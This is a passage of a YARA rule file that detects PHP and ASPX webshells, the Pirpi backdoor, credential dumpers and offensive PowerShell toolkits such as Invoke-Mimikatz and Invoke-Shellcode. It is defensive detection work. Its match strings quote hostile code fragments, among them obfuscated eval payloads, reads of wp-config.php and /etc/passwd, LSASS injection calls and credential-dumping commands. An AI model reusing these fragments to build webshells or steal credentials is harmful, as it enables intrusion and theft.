      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
      $s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
      $s3 = "<title>Antak Webshell</title>" fullword ascii
      $s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii
   condition: 
      ( uint16 ( 0 ) == 0x253C and filesize < 100KB and 1 of ( $s* ) )
} 

rule WebShell_Generic_1609_A_RID2F12 : DEMO FILE GEN T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a PHP webshell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 11:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "return $qwery45234dws($b);" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and 1 of them )
} 

rule UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
      $s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
      $s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
} 

rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
      $s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3c0a and filesize < 300KB and all of them )
} 

rule Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 15:27:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6324 and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )
} 

rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:01:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
      $x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s9 = "$x = $_GET[\"x\"];" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
      $s2 = "input[type=text], input[type=password]{" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x6c3c and filesize < 80KB and all of them )
} 

rule Webshell_e8eaf8da94012e866e51547cd63bb996379690bf_RID3586 : DEMO FILE T1087 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1087, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
      $x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
      $x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x213c and filesize < 100KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 16:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
      $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
      $s3 = "fwrite($fp,base64_decode('" ascii
   condition: 
      ( uint16 ( 0 ) == 0x6324 and filesize < 2KB and all of them )
} 

rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5 : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a web shell"
      author = "Florian Roth"
      reference = "https://github.com/bartblaze/PHP-backdoors"
      date = "2016-09-10 17:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
      $s9 = "$mosimage_session = \"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them )
} 

rule Pirpi_1609_A_RID2AE4 : DEMO EXE FILE G0022 MAL T1136 {
   meta:
      description = "Detects Pirpi Backdoor - and other malware (generic rule)"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 09:11:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0022, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "expand.exe1.gif" fullword ascii
      $c1 = "expand.exe" fullword ascii
      $c2 = "ctf.exe" fullword ascii
      $s1 = "flvUpdate.exe" fullword wide
      $s2 = "www.ThinkWorking.com" fullword wide
      $s3 = "ctfnon.exe" fullword ascii
      $s4 = "flv%d.exe" fullword ascii
      $s5 = "HARDWARE\\DESCRIPTION\\System\\BIOS" fullword ascii
      $s6 = "12811[%d].gif" fullword ascii
      $s7 = "GetApp03" fullword wide
      $s8 = "flvUpdate" fullword wide
      $s9 = "%d-%4.4d%d" fullword ascii
      $s10 = "http://%s/%5.5d.html" fullword ascii
      $s11 = "flvbho.exe" fullword wide
      $op1 = { 74 08 c1 cb 0d 03 da 40 eb } 
      $op2 = { 03 f5 56 8b 76 20 03 f5 33 c9 49 } 
      $op3 = { 03 dd 66 8b 0c 4b 8b 5e 1c 03 dd 8b 04 8b 03 c5 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( $x1 or all of ( $c* ) or all of ( $op* ) ) ) or ( 8 of them )
} 

rule Pirpi_1609_B_RID2AE5 : DEMO EXE FILE G0022 MAL T1136 {
   meta:
      description = "Detects Pirpi Backdoor"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 09:13:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0022, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "tconn <ip> <port> //set temp connect value, and disconnect." fullword ascii
      $s2 = "E* ListenCheckSsl SslRecv fd(%d) Error ret:%d %d" fullword ascii
      $s3 = "%s %s L* ListenCheckSsl fd(%d) SslV(-%d-)" fullword ascii
      $s4 = "S:%d.%d-%d.%d V(%d.%d) Listen On %d Ok." fullword ascii
      $s5 = "E* ListenCheckSsl fd(%d) SslAccept Err %d" fullword ascii
      $s6 = "%s-%s N110 Ssl Connect Ok(%s:%d)." fullword ascii
      $s7 = "%s-%s N110 Basic Connect Ok(%s:%d)." fullword ascii
      $s8 = "tconn <ip> <port>" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 4 of them )
} 

rule pstgdump_RID2A85 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups - file pstgdump_RID2A85.exe"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 06:33:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\pstgdump_RID2A85.pdb" ascii
      $x2 = "Failed to dump all protected storage items - see previous messages for details" fullword ascii
      $x3 = "ptsgdump [-h][-q][-u Username][-p Password]" fullword ascii
      $x4 = "Attempting to impersonate domain user '%s' in domain '%s'" fullword ascii
      $x5 = "Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d" fullword ascii
      $x6 = "Unable to obtain handle to PStoreCreateInstance in pstorec.dll" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule lsremora_RID2A76 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 06:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Target: Failed to load primary SAM functions." fullword ascii
      $x2 = "lsremora_RID2A7664.dll" fullword ascii
      $x3 = "PwDumpError:999999" fullword wide
      $x4 = "PwDumpError" fullword wide
      $x5 = "lsremora_RID2A76.dll" fullword ascii
      $s1 = ":\\\\.\\pipe\\%s" fullword ascii
      $s2 = "x%s_history_%d:%d" fullword wide
      $s3 = "Using pipe %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule servpw_RID29B8 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups - file servpw_RID29B8.exe"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 00:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Unable to open target process: %d, pid %d" fullword ascii
      $s2 = "LSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed: %d" fullword ascii
      $s4 = "lsremora64.dll" fullword ascii
      $s5 = "CreateRemoteThread failed: %d" fullword ascii
      $s6 = "Thread code: %d, path: %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )
} 

rule fgexec_RID2983 : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups - file fgexec_RID2983.exe"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 23:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\fgexec_RID2983.pdb" ascii
      $x2 = "fgexec_RID2983 Remote Process Execution Tool" fullword ascii
      $x3 = "fgexec_RID2983 CallNamedPipe failed" fullword ascii
      $x4 = "fizzgig and the mighty foofus.net team" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule cachedump_RID2ABB : DEMO EXE FILE HKTL T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups - from files cachedump_RID2ABB.exe, cachedump_RID2ABB64.exe"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 08:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Failed to open key SECURITY\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? " fullword ascii
      $s2 = "Unable to open LSASS.EXE process" fullword ascii
      $s3 = "Service not found. Installing CacheDump Service (%s)" fullword ascii
      $s4 = "CacheDump service successfully installed." fullword ascii
      $s5 = "Kill CacheDump service (shouldn't be used)" fullword ascii
      $s6 = "cacheDump [-v | -vv | -K]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )
} 

rule PwDump_B_RID2A0F : DEMO EXE FILE HKTL T1003 T1086 T1136 {
   meta:
      description = "Detects a tool used by APT groups - file PwDump.exe"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08 03:16:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1003, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName" fullword ascii
      $x2 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword ascii
      $x3 = "where -x targets a 64-bit host" fullword ascii
      $x4 = "Couldn't delete target executable from remote machine: %d" fullword ascii
      $s1 = "lsremora64.dll" fullword ascii
      $s2 = "lsremora.dll" fullword ascii
      $s3 = "servpw.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of ( $x* ) ) or ( 3 of them )
} 

rule ps1_toolkit_PowerUp_RID2EBB : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 11:27:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list vdir /text:vdir.name\" | % { " fullword ascii
      $s2 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list apppools /text:name\" | % { " fullword ascii
      $s3 = "if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {" fullword ascii
      $s4 = "C:\\Windows\\System32\\InetSRV\\appcmd.exe list vdir /text:physicalpath | " fullword ascii
      $s5 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe\"))" fullword ascii
      $s6 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\InetSRV\\appcmd.exe\")) {" fullword ascii
      $s7 = "Write-Verbose \"Executing command '$Cmd'\"" fullword ascii
      $s8 = "Write-Warning \"[!] Target service" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 4000KB and 1 of them ) or ( 3 of them )
} 

rule ps1_toolkit_Inveigh_BruteForce_RID3303 : DEMO FILE HKTL T1086 T1110 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 14:29:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1110, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Import-Module .\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 " fullword ascii
      $s2 = "$(Get-Date -format 's') - Attempting to stop HTTP listener\")|Out-Null" fullword ascii
      $s3 = "Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )
} 

rule ps1_toolkit_Invoke_Shellcode_RID3247 : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Invoke-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 13:58:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
      $s2 = "Get-ProcAddress kernel32.dll OpenProcess" fullword ascii
      $s3 = "msfpayload windows/exec CMD=\"cmd /k calc\" EXITFUNC=thread C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -c2- " fullword ascii
      $s4 = "inject shellcode into" ascii
      $s5 = "Injecting shellcode" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 90KB and 1 of them ) or ( 3 of them )
} 

rule ps1_toolkit_Invoke_Mimikatz_RID31FA : DEMO FILE HKTL S0002 T1003 T1075 T1086 T1097 T1136 T1178 {
   meta:
      description = "Semiautomatically generated YARA rule - file Invoke-Mimikatz.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 13:45:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, S0002, T1003, T1075, T1086, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
      $s2 = "ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId" fullword ascii
      $s3 = "privilege::debug exit" ascii
      $s4 = "Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" fullword ascii
      $s5 = "Invoke-Mimikatz -DumpCreds" fullword ascii
      $s6 = "| Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 1 of them ) or ( 3 of them )
} 

rule ps1_toolkit_Invoke_RelfectivePEInjection_RID36F5 : DEMO FILE HKTL T1055 T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Invoke-RelfectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 17:18:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1055, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)" fullword ascii
      $x2 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local" fullword ascii
      $x3 = "} = Get-ProcAddress Advapi32.dll OpenThreadToken" ascii
      $x4 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local" fullword ascii
      $s5 = "$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')" fullword ascii
      $s6 = "= Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 700KB and 2 of them ) or ( all of them )
} 

rule ps1_toolkit_Persistence_RID306E : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Persistence.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 12:39:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\"`\"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```\"root\\subscription```" ascii
      $s2 = "}=$PROFILE.AllUsersAllHosts;${" ascii
      $s3 = "C:\\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup" ascii
      $s4 = "= gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture" ascii
      $s5 = "-eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))" ascii
      $s6 = "}=$PROFILE.CurrentUserAllHosts;${" ascii
      $s7 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
      $s8 = "[System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
} 

rule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection_RID3A9A : DEMO FILE HKTL S0002 T1003 T1055 T1075 T1086 T1097 T1136 T1178 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 19:53:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, S0002, T1003, T1055, T1075, T1086, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
      $s2 = "if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)" fullword ascii
      $s3 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)" fullword ascii
      $s4 = "Function Import-DllInRemoteProcess" fullword ascii
      $s5 = "FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))" fullword ascii
      $s6 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)" fullword ascii
      $s7 = "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)" fullword ascii
      $s8 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null" fullword ascii
      $s9 = "::FromBase64String('RABvAG4AZQAhAA==')))" ascii
      $s10 = "Write-Verbose \"PowerShell ProcessID: $PID\"" fullword ascii
      $s11 = "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 10000KB and 3 of them ) or ( 6 of them )
} 

rule ps1_toolkit_Inveigh_BruteForce_2_RID3394 : DEMO FILE HKTL T1086 T1110 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 14:53:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1110, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "}.NTLMv2_file_queue[0]|Out-File ${" ascii
      $s2 = "}.NTLMv2_file_queue.RemoveRange(0,1)" ascii
      $s3 = "}.NTLMv2_file_queue.Count -gt 0)" ascii
      $s4 = "}.relay_running = $false" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
} 

rule ps1_toolkit_PowerUp_2_RID2F4C : DEMO FILE HKTL T1086 T1087 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 11:51:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if($MyConString -like $([Text.Encoding]::Unicode.GetString([Convert]::" ascii
      $s2 = "FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA=')))) {" ascii
      $s3 = "$Null = Invoke-ServiceStart" ascii
      $s4 = "Write-Warning \"[!] Access to service $" ascii
      $s5 = "} = $MyConString.Split(\"=\")[1].Split(\";\")[0]" ascii
      $s6 = "} += \"net localgroup ${" ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 2000KB and 2 of them ) or ( 4 of them )
} 

rule ps1_toolkit_Persistence_2_RID30FF : DEMO FILE HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Persistence.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
      date = "2016-09-04 13:03:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
      $s2 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBEAGEAaQBsAHkA')" ascii
      $s3 = "FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA==')" ascii
      $s4 = "[Parameter( ParameterSetName = 'ScheduledTaskAtLogon', Mandatory = $True )]" ascii
      $s5 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBBAHQATABvAGcAbwBuAA==')))" ascii
      $s6 = "[Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]" fullword ascii
      $s7 = "FromBase64String('TQBlAHQAaABvAGQA')" ascii
      $s8 = "FromBase64String('VAByAGkAZwBnAGUAcgA=')" ascii
      $s9 = "[Runtime.InteropServices.CallingConvention]::Winapi," fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
} 

rule ps1_toolkit_Inveigh_BruteForce_3_RID3395 : DEMO FILE HKTL T1086 T1110 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - from files Inveigh-BruteForce.ps1"
      author = "Florian Roth"
      reference = "https://github.com/vysec/ps1-toolkit"
